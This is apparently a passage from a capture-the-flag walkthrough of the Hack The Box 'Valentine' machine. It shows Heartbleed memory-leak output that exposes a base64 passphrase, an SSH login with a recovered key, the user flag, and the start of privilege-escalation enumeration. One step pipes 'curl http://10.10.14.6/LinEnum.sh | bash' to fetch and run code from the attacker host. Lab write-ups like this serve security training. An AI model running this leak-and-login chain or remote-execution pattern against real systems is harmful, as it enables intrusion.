$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==..A.d.)3+......Nj.....|+Qe...M1......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#*......v'.............SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#K&\..>0\...a.......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#P.6...#(...]9.u......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==x.UQ.......j..|.U&EMu.O.mn...*......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==J...._..._..<X..6/....t..O..g..........SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#p.....r..J....v.......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
<i.f......SC[...r....+..H...9......#9).....
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#"........]............SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==.L...).$...a.......S9..b...m._..E.........SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==..A.d.)3+......NI.XD...Y.~.....s......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#5....+.Jq.&....[......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#'.....j..b..j`!......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#-...);T..{.m#.......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==x.UQ.......j..|.U&E@?.....x...........SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#V.S...4...k.......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#j..i.^g.....4........SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#N.p.NY..3.........SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==.L...).$...a.......SIV...b'!........SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==..A.d.)3+......N8HI...#k)T.6.......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#[..=,..K...."......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#9
.#......&..?........SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#:...........!.........SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==.....s)N.M.....9.^%]...2.T....-...g......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==x.UQ.......j..|.U&EL.;..Jd..v ..........SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#Y7.........*.......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#L4Fe.eP.<.....|5......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#i........q.ti{Xs......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==.L...).$...a.......SP..2.Y.|...........SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==..A.d.)3+......N1..
...c(..........SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#H{...sH.W.r..A

root@kali:~/valentine#
```

```sh
root@kali:~/valentine# echo aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== | base64 -d
heartbleedbelievethehype
root@kali:~/valentine#
```

###### SSH Enumeration

```sh
root@kali:~/valentine# ssh hype@10.10.10.79 -i hype.key
The authenticity of host '10.10.10.79 (10.10.10.79)' can't be established.
ECDSA key fingerprint is SHA256:lqH8pv30qdlekhX8RTgJTq79ljYnL2cXflNTYu8LS5w.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.79' (ECDSA) to the list of known hosts.
Enter passphrase for key 'hype.key':
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Sun Nov  4 02:08:21 2018 from 10.10.14.2
hype@Valentine:~$ id
uid=1000(hype) gid=1000(hype) groups=1000(hype),24(cdrom),30(dip),46(plugdev),124(sambashare)
hype@Valentine:~$
```

```sh
hype@Valentine:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
hype@Valentine:~$ cd Desktop/
hype@Valentine:~/Desktop$ ls
user.txt
hype@Valentine:~/Desktop$ cat user.txt
e6710a5464769fd5fcd216e076961750
hype@Valentine:~/Desktop$
```

###### Privilege Escalation

```sh
root@kali:~/valentine# wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
--2018-11-04 12:54:20--  https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.248.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.248.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 47585 (46K) [text/plain]
Saving to: ‘LinEnum.sh’

LinEnum.sh                                         100%[================================================================================================================>]  46.47K  --.-KB/s    in 0.04s

2018-11-04 12:54:20 (1.20 MB/s) - ‘LinEnum.sh’ saved [47585/47585]

root@kali:~/valentine#
root@kali:~/valentine# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.79 - - [04/Nov/2018 12:54:50] "GET /LinEnum.sh HTTP/1.1" 200 -
```

```sh
hype@Valentine:~/Desktop$ curl http://10.10.14.6/LinEnum.sh | bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 47585  100 47585    0     0  49743      0 --:--:-- --:--:-- --:--:-- 56988

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.93

[-] Debug Info
[+] Thorough tests = Disabled (SUID/GUID checks will not be perfomed!)


Scan started at:
Sun Nov  4 09:53:53 PST 2018


### SYSTEM ##############################################
[-] Kernel information:
Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux


[-] Kernel information (continued):
Linux version 3.2.0-23-generic (buildd@crested) (gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu4) ) #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012


[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=12.04
DISTRIB_CODENAME=precise
DISTRIB_DESCRIPTION="Ubuntu 12.04 LTS"


[-] Hostname:
Valentine


### USER/GROUP ##########################################
[-] Current user/group info:
uid=1000(hype) gid=1000(hype) groups=1000(hype),24(cdrom),30(dip),46(plugdev),124(sambashare)


[-] Users that have previously logged onto the system:
Username         Port     From             Latest
root             tty1                      Fri Feb 16 14:38:30 -0800 2018
hype             pts/0    10.10.14.6       Sun Nov  4 09:50:53 -0800 2018


[-] Who else is logged on:
 09:53:53 up 10:19,  1 user,  load average: 0.02, 0.11, 0.20
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
hype     pts/0    10.10.14.6       09:50    3.00s  0.26s  0.00s bash


[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(libuuid) gid=101(libuuid) groups=101(libuuid)
uid=101(syslog) gid=103(syslog) groups=103(syslog)
uid=102(messagebus) gid=105(messagebus) groups=105(messagebus)
uid=103(colord) gid=108(colord) groups=108(colord)
uid=104(lightdm) gid=111(lightdm) groups=111(lightdm)
uid=105(whoopsie) gid=114(whoopsie) groups=114(whoopsie)
uid=106(avahi-autoipd) gid=117(avahi-autoipd) groups=117(avahi-autoipd)
uid=107(avahi) gid=118(avahi) groups=118(avahi)
uid=108(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=109(kernoops) gid=65534(nogroup) groups=65534(nogroup)
uid=110(pulse) gid=119(pulse) groups=119(pulse),29(audio)
uid=111(rtkit) gid=122(rtkit) groups=122(rtkit)
uid=112(speech-dispatcher) gid=29(audio) groups=29(audio)
uid=113(hplip) gid=7(lp) groups=7(lp)
uid=114(saned) gid=123(saned) groups=123(saned)
uid=1000(hype) gid=1000(hype) groups=1000(hype),24(cdrom),30(dip),46(plugdev),124(sambashare)
uid=115(sshd) gid=65534(nogroup) groups=65534(nogroup)


[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
colord:x:103:108:colord colour management daemon,,,:/var/lib/colord:/bin/false
lightdm:x:104:111:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:105:114::/nonexistent:/bin/false
avahi-autoipd:x:106:117:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:107:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
usbmux:x:108:46:usbmux daemon,,,:/home/usbmux:/bin/false
kernoops:x:109:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:110:119:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:111:122:RealtimeKit,,,:/proc:/bin/false
speech-dispatcher:x:112:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false
saned:x:114:123::/home/saned:/bin/false
hype:x:1000:1000:Hemorrhage,,,:/home/hype:/bin/bash
sshd:x:115:65534::/var/run/sshd:/usr/sbin/nologin


[-] Super user account(s):
root


[-] Are permissions on /home directories lax:
total 12K
drwxr-xr-x  3 root root 4.0K Dec 11  2017 .
drwxr-xr-x 26 root root 4.0K Feb  6  2018 ..
drwxr-xr-x 21 hype hype 4.0K Feb  5  2018 hype


[-] Root is allowed to login via SSH:
PermitRootLogin yes


### ENVIRONMENTAL #######################################
[-] Environment information:
SHELL=/bin/bash
TERM=xterm-256color
XDG_SESSION_COOKIE=c9052f1b76300a5447f46cc700000004-1541353853.263151-2086069125
SSH_CLIENT=10.10.14.6 50660 22
SSH_TTY=/dev/pts/0
USER=hype
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
MAIL=/var/mail/hype
PWD=/home/hype/Desktop
LANG=en_US.UTF-8
HOME=/home/hype
SHLVL=2
LOGNAME=hype
LC_CTYPE=en_US.UTF-8
SSH_CONNECTION=10.10.14.6 50660 10.10.10.79 22
LESSOPEN=| /usr/bin/lesspipe %s
LESSCLOSE=/usr/bin/lesspipe %s %s
_=/usr/bin/env


[-] Path information:
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games


[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
/usr/bin/tmux


[-] Current umask value:
0002
u=rwx,g=rwx,o=rx


[-] umask value as specified in /etc/login.defs:
UMASK		022


[-] Password and storage information:
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512


### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r-- 1 root root  722 Apr  2  2012 /etc/crontab

/etc/cron.d:
total 28
drwxr-xr-x   2 root root  4096 Dec 11  2017 .
drwxr-xr-x 132 root root 12288 Nov  4 00:34 ..
-rw-r--r--   1 root root   288 Jun 20  2010 anacron
-rw-r--r--   1 root root   544 Feb 13  2017 php5
-rw-r--r--   1 root root   102 Apr  2  2012 .placeholder

/etc/cron.daily:
total 84
drwxr-xr-x   2 root root  4096 Dec 11  2017 .
drwxr-xr-x 132 root root 12288 Nov  4 00:34 ..
-rwxr-xr-x   1 root root   311 Jun 20  2010 0anacron
-rwxr-xr-x   1 root root   633 Jul 15  2016 apache2
-rwxr-xr-x   1 root root   219 Apr 10  2012 apport
-rwxr-xr-x   1 root root 15399 Apr 20  2012 apt
-rwxr-xr-x   1 root root   502 Mar 31  2012 bsdmainutils
-rwxr-xr-x   1 root root   256 Apr 12  2012 dpkg
-rwxr-xr-x   1 root root   372 Oct  4  2011 logrotate
-rwxr-xr-x   1 root root  1365 Mar 31  2012 man-db
-rwxr-xr-x   1 root root   606 Aug 17  2011 mlocate
-rwxr-xr-x   1 root root   249 Apr  8  2012 passwd
-rw-r--r--   1 root root   102 Apr  2  2012 .placeholder
-rwxr-xr-x   1 root root  2417 Jul  1  2011 popularity-contest
-rwxr-xr-x   1 root root  2947 Apr  2  2012 standard
-rwxr-xr-x   1 root root   214 Apr 19  2012 update-notifier-common

/etc/cron.hourly:
total 20
drwxr-xr-x   2 root root  4096 Apr 25  2012 .
drwxr-xr-x 132 root root 12288 Nov  4 00:34 ..
-rw-r--r--   1 root root   102 Apr  2  2012 .placeholder

/etc/cron.monthly:
total 24
drwxr-xr-x   2 root root  4096 Apr 25  2012 .
drwxr-xr-x 132 root root 12288 Nov  4 00:34 ..
-rwxr-xr-x   1 root root   313 Jun 20  2010 0anacron
-rw-r--r--   1 root root   102 Apr  2  2012 .placeholder

/etc/cron.weekly:
total 32
drwxr-xr-x   2 root root  4096 Apr 25  2012 .
drwxr-xr-x 132 root root 12288 Nov  4 00:34 ..
-rwxr-xr-x   1 root root   312 Jun 20  2010 0anacron
-rwxr-xr-x   1 root root   730 Dec 30  2011 apt-xapian-index
-rwxr-xr-x   1 root root   907 Mar 31  2012 man-db
-rw-r--r--   1 root root   102 Apr  2  2012 .placeholder


[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


[-] Anacron jobs and associated file permissions:
-rw-r--r-- 1 root root 395 Jun 20  2010 /etc/anacrontab
# /etc/anacrontab: configuration file for anacron

# See anacron(8) and anacrontab(5) for details.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# These replace cron's entries
1	5	cron.daily	 nice run-parts --report /etc/cron.daily
7	10	cron.weekly	 nice run-parts --report /etc/cron.weekly
@monthly	15	cron.monthly nice run-parts --report /etc/cron.monthly


[-] When were jobs last executed (/var/spool/anacron contents):
total 20
drwxr-xr-x 2 root root 4096 Dec 11  2017 .
drwxr-xr-x 8 root root 4096 Apr 25  2012 ..
-rw------- 1 root root    9 Nov  4 00:46 cron.daily
-rw------- 1 root root    9 Nov  4 00:50 cron.monthly
-rw------- 1 root root    9 Nov  4 00:46 cron.weekly


### NETWORKING  ##########################################
[-] Network and IP info:
eth0      Link encap:Ethernet  HWaddr 00:50:56:b4:10:c0
          inet addr:10.10.10.79  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: dead:beef::ac91:b967:24de:bdd0/64 Scope:Global
          inet6 addr: dead:beef::250:56ff:feb4:10c0/64 Scope:Global
          inet6 addr: fe80::250:56ff:feb4:10c0/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:2280080 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1679798 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:295119389 (295.1 MB)  TX bytes:354087642 (354.0 MB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:8699 errors:0 dropped:0 overruns:0 frame:0
          TX packets:8699 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:1534701 (1.5 MB)  TX bytes:1534701 (1.5 MB)


[-] ARP history:
? (10.10.10.2) at 00:50:56:b4:f5:b5 [ether] on eth0


[-] Nameserver(s):
nameserver 8.8.8.8


[-] Default route:
default         10.10.10.2      0.0.0.0         UG    100    0        0 eth0


[-] Listening TCP:
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -
tcp        0    152 10.10.10.79:22          10.10.14.6:50660        ESTABLISHED -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 ::1:631                 :::*                    LISTEN      -
tcp6       0      0 :::443                  :::*                    LISTEN      -


[-] Listening UDP:
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
udp        0      0 0.0.0.0:34117           0.0.0.0:*                           -
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -
udp6       0      0 :::45776                :::*                                -
udp6       0      0 :::5353                 :::*                                -


### SERVICES #############################################
[-] Running processes:
USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root          1  0.0  0.2  24432  2400 ?        Ss   00:34   0:00 /sbin/init
root          2  0.0  0.0      0     0 ?        S    00:34   0:00 [kthreadd]
root          3  0.0  0.0      0     0 ?        S    00:34   0:03 [ksoftirqd/0]
root          6  0.0  0.0      0     0 ?        S    00:34   0:00 [migration/0]
root          7  0.0  0.0      0     0 ?        S    00:34   0:00 [watchdog/0]
root          8  0.0  0.0      0     0 ?        S<   00:34   0:00 [cpuset]
root          9  0.0  0.0      0     0 ?        S<   00:34   0:00 [khelper]
root         10  0.0  0.0      0     0 ?        S    00:34   0:00 [kdevtmpfs]
root         11  0.0  0.0      0     0 ?        S<   00:34   0:00 [netns]
root         12  0.0  0.0      0     0 ?        S    00:34   0:00 [sync_supers]
root         13  0.0  0.0      0     0 ?        S    00:34   0:00 [bdi-default]
root         14  0.0  0.0      0     0 ?        S<   00:34   0:00 [kintegrityd]
root         15  0.0  0.0      0     0 ?        S<   00:34   0:00 [kblockd]
root         16  0.0  0.0      0     0 ?        S<   00:34   0:00 [ata_sff]
root         17  0.0  0.0      0     0 ?        S    00:34   0:00 [khubd]
root         18  0.0  0.0      0     0 ?        S<   00:34   0:00 [md]
root         19  0.0  0.0      0     0 ?        S    00:34   0:00 [kworker/u:1]
root         21  0.0  0.0      0     0 ?        S    00:34   0:00 [khungtaskd]
root         22  0.0  0.0      0     0 ?        S    00:34   0:00 [kswapd0]
root         23  0.0  0.0      0     0 ?        SN   00:34   0:00 [ksmd]
root         24  0.0  0.0      0     0 ?        SN   00:34   0:00 [khugepaged]
root         25  0.0  0.0      0     0 ?        S    00:34   0:00 [fsnotify_mark]
root         26  0.0  0.0      0     0 ?        S    00:34   0:00 [ecryptfs-kthrea]
root         27  0.0  0.0      0     0 ?        S<   00:34   0:00 [crypto]
root         35  0.0  0.0      0     0 ?        S<   00:34   0:00 [kthrotld]
root         37  0.0  0.0      0     0 ?        S    00:34   0:00 [scsi_eh_0]
root         38  0.0  0.0      0     0 ?        S    00:34   0:00 [scsi_eh_1]
root         39  0.0  0.0      0     0 ?        S    00:34   0:00 [kworker/u:2]
root         59  0.0  0.0      0     0 ?        S<   00:34   0:00 [devfreq_wq]
root         60  0.0  0.0      0     0 ?        S    00:34   0:17 [kworker/0:2]
root        156  0.0  0.0      0     0 ?        S    00:34   0:00 [scsi_eh_2]
root        163  0.0  0.0      0     0 ?        S<   00:34   0:00 [vmw_pvscsi_wq_2]
root        217  0.0  0.0      0     0 ?        S    00:34   0:00 [jbd2/sda1-8]
root        218  0.0  0.0      0     0 ?        S<   00:34   0:00 [ext4-dio-unwrit]
root        304  0.0  0.0  17224   640 ?        S    00:34   0:00 upstart-udev-bridge --daemon
root        306  0.0  0.1  22008  1820 ?        Ss   00:34   0:00 /sbin/udevd --daemon
root        490  0.0  0.1  21980  1356 ?        S    00:34   0:00 /sbin/udevd --daemon
root        491  0.0  0.1  22004  1304 ?        S    00:34   0:00 /sbin/udevd --daemon
root        544  0.0  0.0      0     0 ?        S<   00:34   0:00 [kpsmoused]
root        653  0.0  0.0  15180   388 ?        S    00:34   0:00 upstart-socket-bridge --daemon
102         763  0.0  0.1  24072  1240 ?        Ss   00:34   0:00 dbus-daemon --system --fork --activation=upstart
root        804  0.0  0.3  79036  3192 ?        Ss   00:34   0:00 /usr/sbin/modem-manager
root        808  0.0  0.1  21180  1724 ?        Ss   00:34   0:00 /usr/sbin/bluetoothd
root        826  0.0  0.6 174444  6604 ?        Ssl  00:34   0:00 NetworkManager
syslog      833  0.0  0.1 249464  1584 ?        Sl   00:34   0:01 rsyslogd -c5
root        835  0.0  0.3 203500  3892 ?        Sl   00:34   0:00 /usr/lib/policykit-1/polkitd --no-debug
avahi       843  0.0  0.1  32300  1768 ?        S    00:34   0:00 avahi-daemon: running [Valentine.local]
avahi       844  0.0  0.0  32172   472 ?        S    00:34   0:00 avahi-daemon: chroot helper
root        846  0.0  0.3 104088  3692 ?        Ss   00:34   0:00 /usr/sbin/cupsd -F
root        847  0.0  0.0      0     0 ?        S<   00:34   0:00 [krfcommd]
root        898  0.0  0.0      0     0 ?        S    00:34   0:00 [flush-8:0]
root        953  0.0  0.2  49952  2860 ?        Ss   00:35   0:00 /usr/sbin/sshd -D
root       1044  0.0  0.0  19976   976 tty4     Ss+  00:35   0:00 /sbin/getty -8 38400 tty4
root       1053  0.0  0.0  19976   976 tty5     Ss+  00:35   0:00 /sbin/getty -8 38400 tty5
root       1055  0.0  0.1  26416  1676 ?        Ss   00:35   0:11 /usr/bin/tmux -S /.devs/dev_sess
root       1058  0.0  0.4  20652  4580 pts/10   Ss+  00:35   0:00 -bash
root       1072  0.0  0.0  19976   976 tty2     Ss+  00:35   0:00 /sbin/getty -8 38400 tty2
root       1074  0.0  0.0  19976   980 tty3     Ss+  00:35   0:00 /sbin/getty -8 38400 tty3
root       1079  0.0  0.0  19976   968 tty6     Ss+  00:35   0:00 /sbin/getty -8 38400 tty6
whoopsie   1102  0.0  0.5 203060  5544 ?        Ssl  00:35   0:00 whoopsie
root       1105  0.0  0.0   4452   808 ?        Ss   00:35   0:00 acpid -c /etc/acpi/events -s /var/run/acpid.socket
root       1109  0.0  0.1  19104  1032 ?        Ss   00:35   0:00 cron
daemon     1110  0.0  0.0  16900   380 ?        Ss   00:35   0:00 atd
root       1148  0.0  0.4 162284  4320 ?        Sl   00:35   0:18 /usr/bin/vmtoolsd
root       1225  0.0  1.0 113124 10976 ?        Ss   00:35   0:01 /usr/sbin/apache2 -k start
root       1471  0.0  0.0  19976   972 tty1     Ss+  00:35   0:00 /sbin/getty -8 38400 tty1
root       1650  0.0  1.0  66916 10304 ?        S    00:35   0:00 /usr/lib/vmware-vgauth/VGAuthService -s
root       1686  0.0  0.5 510124  5488 ?        Sl   00:35   0:09 //usr/lib/vmware-caf/pme/bin/ManagementAgentHost
root       2802  0.0  0.3 584296  3880 ?        Sl   02:08   0:00 /usr/sbin/console-kit-daemon --no-daemon
root       3164  0.0  0.4  20660  4684 pts/1    Ss+  02:16   0:00 -bash
www-data   4714  0.0  0.7 113672  7312 ?        S    09:35   0:00 /usr/sbin/apache2 -k start
www-data   4753  0.0  0.8 113672  8544 ?        S    09:36   0:00 /usr/sbin/apache2 -k start
www-data   4756  0.0  0.7 113672  7312 ?        S    09:37   0:00 /usr/sbin/apache2 -k start
www-data   4758  0.0  0.7 113672  7312 ?        S    09:37   0:00 /usr/sbin/apache2 -k start
www-data   4763  0.0  0.8 113672  8544 ?        S    09:37   0:00 /usr/sbin/apache2 -k start
www-data   4765  0.0  0.7 113672  7312 ?        S    09:37   0:00 /usr/sbin/apache2 -k start
www-data   4774  0.0  0.8 113892  8588 ?        S    09:37   0:00 /usr/sbin/apache2 -k start
www-data   4775  0.0  0.8 113672  8532 ?        S    09:37   0:00 /usr/sbin/apache2 -k start
www-data   4780  0.0  0.8 113672  8532 ?        S    09:38   0:00 /usr/sbin/apache2 -k start
www-data   4786  0.0  0.8 113672  8532 ?        S    09:38   0:00 /usr/sbin/apache2 -k start
root       4813  0.0  0.0      0     0 ?        S    09:42   0:00 [kworker/0:1]
root       4822  0.0  0.0      0     0 ?        S    09:47   0:00 [kworker/0:0]
root       4831  0.0  0.3  92220  3976 ?        Ss   09:50   0:00 sshd: hype [priv]
hype       4975  0.0  0.1  92220  1672 ?        S    09:50   0:00 sshd: hype@pts/0
